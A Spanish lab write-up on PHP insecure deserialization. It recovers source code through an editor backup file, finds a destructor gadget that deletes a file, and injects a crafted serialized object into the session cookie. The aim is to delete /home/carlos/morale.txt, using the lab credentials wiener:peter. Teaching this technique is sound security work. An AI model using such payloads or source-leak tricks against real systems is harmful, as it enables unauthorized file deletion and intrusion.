# 🧬 Inyección de objetos arbitrarios en PHP

## 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización de objetos PHP para gestionar la sesión**.\
El backend deserializa directamente el contenido de la cookie de sesión en cada petición.

La aplicación no valida la clase del objeto deserializado, lo que permite **inyectar un objeto arbitrario** en la cookie.

Mediante el análisis del código fuente es posible identificar una clase vulnerable cuyo **método destructor elimina archivos del sistema**.

🎯 **Objetivo del laboratorio:**

* Inyectar un objeto serializado malicioso
* Conseguir que el servidor elimine el archivo:

```
/home/carlos/morale.txt
```

```
wiener : peter
```



## 📚 Teoría

Este laboratorio introduce una variante más avanzada de **Insecure Deserialization**: la **inyección de objetos arbitrarios**.

En lugar de modificar atributos de un objeto existente, el atacante puede enviar **un objeto completamente diferente**.

### 📌 Flujo vulnerable

La aplicación maneja la sesión de la siguiente manera:

```
1. El estado de sesión se almacena en una cookie serializada
2. El backend ejecuta unserialize() sobre esa cookie
3. El objeto resultante se usa dentro de la aplicación
```

Ejemplo simplificado:

```
unserialize($_COOKIE['session']);
```

El problema es que **no se valida la clase del objeto resultante**.

Si el objeto contiene **métodos mágicos**, estos pueden ejecutarse automáticamente.

### 📌 Gadget vulnerable

Al revisar el código fuente encontramos la clase:

```
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```

El método mágico `__destruct()` se ejecuta automáticamente cuando el objeto se destruye.

El atributo peligroso es:

```
lock_file_path
```

Este valor se utiliza directamente en:

```
unlink($this->lock_file_path);
```

Si conseguimos controlar ese atributo, el servidor eliminará cualquier archivo indicado.

Este patrón es un ejemplo clásico de:

**POP (Property-Oriented Programming)**

### 1️⃣ Obtener el código fuente

Buscamos archivos accesibles directamente en el servidor.

Sabemos que necesitamos ver las clases definidas por la aplicación.

<br>

Un truco habitual es solicitar **archivos de backup creados por editores**, añadiendo `~` al final del nombre.

Accedemos a:

```
/CustomTemplate.php~
```

El servidor devuelve el código fuente completo de la clase vulnerable.



### 2️⃣ Analizar la clase vulnerable

Del código obtenido identificamos el método:

```
function __destruct() {
    if (file_exists($this->lock_file_path)) {
        unlink($this->lock_file_path);
    }
}
```

Conclusiones:

```
lock_file_path controla qué archivo se elimina
no existe validación de rutas
__destruct se ejecuta automáticamente
```

Por lo tanto, basta con crear un objeto donde:

```
lock_file_path = /home/carlos/morale.txt
```



### 3️⃣ Construir el objeto serializado

Creamos manualmente un objeto de la clase `CustomTemplate`.

Datos necesarios:

```
Clase: CustomTemplate (14 caracteres)
Propiedad: lock_file_path (14 caracteres)
Ruta: /home/carlos/morale.txt (23 caracteres)
```

Objeto serializado:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Este será el **payload final**.



### 4️⃣ Inyectar el objeto en la cookie

Iniciamos sesión con:

```
wiener : peter
```

Capturamos una petición autenticada en **Burp Suite**.

Localizamos la cookie:

```
session=...
```

Reemplazamos completamente su valor por el objeto serializado.

Dependiendo del laboratorio puede ser necesario:

```
Base64 encode
URL encode
```

### 5️⃣ Enviar la petición

Enviamos la petición con la cookie modificada.

En el backend ocurre lo siguiente:

```
1. unserialize() crea un objeto CustomTemplate
2. el objeto permanece en memoria durante la petición
3. al finalizar el script se ejecuta __destruct()
```

El método ejecuta:

```
unlink("/home/carlos/morale.txt");
```



### 6️⃣ Resultado

Se consigue:

* Inyectar un objeto arbitrario en la cookie de sesión
* Ejecutar un **método destructor peligroso**
* Eliminar el archivo:

```
/home/carlos/morale.txt
```

✅ **Laboratorio resuelto.**
